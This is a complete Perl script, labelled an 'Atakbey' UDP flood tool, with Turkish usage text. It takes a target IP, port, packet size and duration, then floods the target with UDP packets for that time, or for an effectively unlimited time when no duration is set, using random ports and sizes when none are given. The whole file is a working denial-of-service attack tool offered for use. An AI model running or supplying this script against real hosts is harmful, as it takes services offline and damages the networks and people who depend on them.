#!/usr/bin/perl
 
##############
# Atakbey Layer 4 UDP Flood Script.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "udpflood.pl <ip> <port> <boyut> <sure>\n\n";
  print " port=0: hedef port\n";
  print " boyut=0: genellike 64 veya 1024\n";
  print " sure=0: saldiri kac saniye yapilacak\n";
  print " Script Saglayici Atakbey\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Gecersiz Sunucu Adresi $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, AF_INET, SOCK_DGRAM, 17);
 
 
print "Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Saldirici cekmek icin Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
